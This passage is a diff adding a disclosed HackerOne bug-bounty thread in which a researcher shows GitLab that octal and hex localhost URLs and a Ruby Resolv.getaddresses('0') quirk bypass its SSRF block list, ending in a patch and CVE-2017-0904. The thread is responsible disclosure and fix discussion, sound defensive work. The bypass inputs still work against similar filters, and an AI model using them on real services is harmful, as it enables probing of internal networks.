MUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3e49ea5fcbbb5ded7a8a1ef823a4cbab04d9c4a5b65de7c5fe01afcb1dd35cba\" data-attachment-type=\"text/x-ruby\">url_blocker.rb.patch (F236128)</a>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2131996, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/492/19e158bd8d3f42245a71d113f61d776bab3c5012/Screenshot_from_2017-11-04_13-43-16.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=daead9dc24dd4c1dd1d0861413708d0b8338805ec0ce7c90591dd4f24d3c196a", 
+                    "type": "image/png", 
+                    "id": 236492, 
+                    "filename": "Screenshot_from_2017-11-04_13-43-16.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-04T12:43:56.704Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-04T12:43:56.704Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I might start fuzzing `Resolv::getaddresses` just to see if I can find some more bypasses. In the mean time, here is another bypass:\n\n```\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> Resolv.getaddresses(\"0\")\n=> []\n```\n\n{F236492}\n", 
+            "markdown_message": "<p>I might start fuzzing <code>Resolv::getaddresses</code> just to see if I can find some more bypasses. In the mean time, here is another bypass:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; Resolv.getaddresses(&quot;0&quot;)\n=&gt; []\n</code></pre>\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_from_2017-11-04_13-43-16.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/492/19e158bd8d3f42245a71d113f61d776bab3c5012/Screenshot_from_2017-11-04_13-43-16.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=daead9dc24dd4c1dd1d0861413708d0b8338805ec0ce7c90591dd4f24d3c196a\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/236/492/19e158bd8d3f42245a71d113f61d776bab3c5012/Screenshot_from_2017-11-04_13-43-16.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=daead9dc24dd4c1dd1d0861413708d0b8338805ec0ce7c90591dd4f24d3c196a\" class=\"markdown-inline-image\"></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2134189, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-06T16:21:23.050Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-06T16:21:23.050Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "@edio,\n\nI think you're seeing how difficult this problem is to solve at this level. :)\n\nWe're looking at a mix of methods now to provide comprehensive protection. Hopefully we'll get this fixed up and merged later today. I'll send you an update!", 
+            "markdown_message": "<p><a href=\"/edio\">@edio</a>,</p>\n\n<p>I think you&#39;re seeing how difficult this problem is to solve at this level. :)</p>\n\n<p>We&#39;re looking at a mix of methods now to provide comprehensive protection. Hopefully we&#39;ll get this fixed up and merged later today. I&#39;ll send you an update!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2137335, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-06T16:24:26.593Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-06T16:24:26.593Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nThe worst thing is it turns out, because the issue stems from Ruby's native resolver this issue affects other applications. I have just bypassed multiple SSRF filters and a couple SSRF mitigation gems. All vendors and gem authors have been notified and I plan on publishing a security advisory for this issue alongside your security update this week.", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>The worst thing is it turns out, because the issue stems from Ruby&#39;s native resolver this issue affects other applications. I have just bypassed multiple SSRF filters and a couple SSRF mitigation gems. All vendors and gem authors have been notified and I plan on publishing a security advisory for this issue alongside your security update this week.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2137346, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-06T21:18:36.807Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-06T21:18:36.807Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Quick update:\n\nWe have a version going through testing now that replaces the `Resolv.getaddresses()` call with a `Addrinfo.getaddrinfo()` call. This very similar to the code you mention above that uses `Socket.getaddrinfo()`. The Ruby `Addrinfo` class is a direct mapping of the underlying `struct addrinfo` used by the OS. Hopefully we can get that into a security release tomorrow. Feel free to test yourself using something like this:\n\n```\n          server_ips = Addrinfo.getaddrinfo(uri.hostname, 80, nil, :STREAM).map(&:ip_address)\n```\n\nThere is a second `rescue` clause needed for strings that don't resolve. (SocketError)\n\nI think it would be a mistake to think of the Resolv library not handling these values as a bug. I would honestly expect those libraries to deal only with actual DNS queries and not get involved with lower level translations. I'll be back in touch tomorrow to let you know how things are going. Thanks again for being so patient.", 
+            "markdown_message": "<p>Quick update:</p>\n\n<p>We have a version going through testing now that replaces the <code>Resolv.getaddresses()</code> call with a <code>Addrinfo.getaddrinfo()</code> call. This very similar to the code you mention above that uses <code>Socket.getaddrinfo()</code>. The Ruby <code>Addrinfo</code> class is a direct mapping of the underlying <code>struct addrinfo</code> used by the OS. Hopefully we can get that into a security release tomorrow. Feel free to test yourself using something like this:</p>\n<pre class=\"highlight plaintext\"><code>          server_ips = Addrinfo.getaddrinfo(uri.hostname, 80, nil, :STREAM).map(&amp;:ip_address)\n</code></pre>\n<p>There is a second <code>rescue</code> clause needed for strings that don&#39;t resolve. (SocketError)</p>\n\n<p>I think it would be a mistake to think of the Resolv library not handling these values as a bug. I would honestly expect those libraries to deal only with actual DNS queries and not get involved with lower level translations. I&#39;ll be back in touch tomorrow to let you know how things are going. Thanks again for being so patient.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2138280, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-07T10:11:05.078Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-07T10:11:05.078Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nThis is great to hear! Concerning your final statement, this is a bug and is actually documented here: https://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs. I am not particularly satisfied with those two little bullet points, I would expect a clear warning somewhere in the docs similar to how the Python docs do it.\n\nAlso I have finally discovered where the empty value is returned:\n\n```ruby\n# File lib/resolv.rb, line 100\ndef getaddresses(name)\n ret = []\n each_address(name) {|address| ret << address}\n return ret\nend\n```\n\nThe Ruby Core dev team have responded to my report and we are currently discussing the issue. I will keep you updated.", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>This is great to hear! Concerning your final statement, this is a bug and is actually documented here: <a title=\"https://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs\" href=\"/redirect?signature=ad0f258fa23b7af44d96b50e199b97c70d31dc81&amp;url=https%3A%2F%2Fdocs.ruby-lang.org%2Fen%2F2.4.0%2FResolv.html%23class-Resolv-label-Bugs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://docs.ruby-lang.org/en/2.4.0/Resolv.html#class-Resolv-label-Bugs</span><i class=\"icon-external-link\"></i></a>. I am not particularly satisfied with those two little bullet points, I would expect a clear warning somewhere in the docs similar to how the Python docs do it.</p>\n\n<p>Also I have finally discovered where the empty value is returned:</p>\n<pre class=\"highlight ruby\"><code><span class=\"c1\"># File lib/resolv.rb, line 100</span>\n<span class=\"k\">def</span> <span class=\"nf\">getaddresses</span><span class=\"p\">(</span><span class=\"nb\">name</span><span class=\"p\">)</span>\n <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n <span class=\"n\">each_address</span><span class=\"p\">(</span><span class=\"nb\">name</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"o\">|</span><span class=\"n\">address</span><span class=\"o\">|</span> <span class=\"n\">ret</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">address</span><span class=\"p\">}</span>\n <span class=\"k\">return</span> <span class=\"n\">ret</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>The Ruby Core dev team have responded to my report and we are currently discussing the issue. I will keep you updated.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2139763, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-07T17:22:45.083Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-07T17:22:45.083Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "The bug in `Resolv::getaddresses` has been assigned [CVE-2017-0904](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0904).", 
+            "markdown_message": "<p>The bug in <code>Resolv::getaddresses</code> has been assigned <a href=\"/redirect?signature=08431aa947c4a573c3d214d59ebe44d2353fd4f0&amp;url=http%3A%2F%2Fwww.cve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3D2017-0904\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CVE-2017-0904</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2140823, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-07T23:01:49.809Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-07T23:01:49.809Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Ah, that's good to know. I'm used to lower level programming myself, where libraries have a more specific purpose. In the meantime we've switched over to the other library. \n\nOur security release didn't quite make it out today but will certainly go out tomorrow. I hope that gives you enough time to reference it in your announcement later this week.", 
+            "markdown_message": "<p>Ah, that&#39;s good to know. I&#39;m used to lower level programming myself, where libraries have a more specific purpose. In the meantime we&#39;ve switched over to the other library. </p>\n\n<p>Our security release didn&#39;t quite make it out today but will certainly go out tomorrow. I hope that gives you enough time to reference it in your announcement later this week.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2141642, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "edoverflow", 
+                "url": "/edoverflow"
+            }, 
+            "created_at": "2017-11-09T02:52:50.043Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-09T02:52:50.043Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi again @edio,\n\nA patch for this vulnerability was included in our 10.1.2 security release earlier today.\n\nhttps://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/\n\nThanks again for the report!", 
+            "markdown_message": "<p>Hi again <a href=\"/edio\">@edio</a>,</p>\n\n<p>A patch for this vulnerability was included in our 10.1.2 security release earlier today.</p>\n\n<p><a title=\"https://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/\" href=\"/redirect?signature=e316910d6c966b4e1ed51ca5851b34a1063b64ce&amp;url=https%3A%2F%2Fabout.gitlab.com%2F2017%2F11%2F08%2Fgitlab-10-dot-1-dot-2-security-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://about.gitlab.com/2017/11/08/gitlab-10-dot-1-dot-2-security-release/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Thanks again for the report!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2144880, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-09T02:57:40.805Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-09T02:57:40.805Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2144881, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-09T17:51:58.162Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-09T17:51:58.162Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nFantastic work! Here is my write-up: https://edoverflow.com/2017/ruby-resolv-bug/.", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>Fantastic work! Here is my write-up: <a title=\"https://edoverflow.com/2017/ruby-resolv-bug/\" href=\"/redirect?signature=0842202ab0c39fea5a1f3a162725d485e221d4ea&amp;url=https%3A%2F%2Fedoverflow.com%2F2017%2Fruby-resolv-bug%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://edoverflow.com/2017/ruby-resolv-bug/</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2146887, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-09T17:51:58.358Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-09T17:51:58.358Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2146888, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-09T18:07:14.730Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-09T18:07:14.730Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "\"ResolvBleed\", eh? :)", 
+            "markdown_message": "<p>&quot;ResolvBleed&quot;, eh? :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2146927, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "edoverflow", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/edoverflow", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/116/374/2e86e29173a7b27dc4e4c35ecaef804781110b9f_small.png?1527882436"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 68, 
+        "name": "Server-Side Request Forgery (SSRF)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -31347144.9260866, 
+    "disclosed_at": "2017-11-09T17:51:58.312Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/215105", 
+    "created_at": "2017-03-21T14:12:33.846Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Dear GitLab bug bounty team,</p>\n\n<h1 id=\"summary\">Summary</h1>\n\n<hr>\n\n<p>It appears as though the fix to <a href=\"/redirect?signature=b6ba17db1210c99be99840f604ef209c9ab7ddeb&amp;url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F17286\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>!17286</span><i class=\"icon-external-link\"></i></a> can be easily bypassed. You have blocked the usage of <code>http://127.0.0.1</code>, <code>http://localhost/</code>, etc., but <code>http://0177.1/</code> and <code>http://0x7f.1/</code>, for instance, can still be used to scan internal ports.</p>\n<pre class=\"highlight plaintext\"><code>Error importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository &#39;[REPOS PATH]/{username}/{project}.git&#39;...\nfatal: unable to access &#39;http://0177.1:22/&#39;: Recv failure: Connection reset by peer\n</code></pre>\n<p>Admittedly, you have restricted the use of certain ports, but I still believe this needs to be fixed.</p>\n\n<h1 id=\"fix\">Fix</h1>\n\n<hr>\n\n<p>Block decimal, octal and hex localhost notation.</p>\n\n<p>Best regards,<br>\nEd</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://about.gitlab.com", 
+            "about": "Open source software to collaborate on code", 
+            "twitter_handle": "gitlab", 
+            "name": "GitLab"
+        }, 
+        "handle": "gitlab", 
+        "url": "https://hackerone.com/gitlab", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/264/338ec4b43393873324e3f1911f2f107d025d13f1_small.png?1454722206", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 264, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
